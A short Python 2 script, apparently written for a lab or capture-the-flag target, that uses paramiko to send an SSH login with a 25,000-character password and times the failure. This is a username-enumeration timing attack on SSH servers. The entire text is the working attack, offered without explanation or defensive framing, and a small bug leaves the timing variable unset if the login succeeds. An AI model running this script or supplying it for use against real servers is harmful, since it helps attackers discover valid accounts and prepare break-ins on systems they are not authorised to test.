import paramiko
import time
user=raw_input("mitch ")
p='A'*25000
ssh = paramiko.SSHClient()
starttime=time.clock()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
try:
        ssh.connect('10.10.19.172', username=user,
        password=p)
except:
        endtime=time.clock()
total=endtime-starttime
print(total)
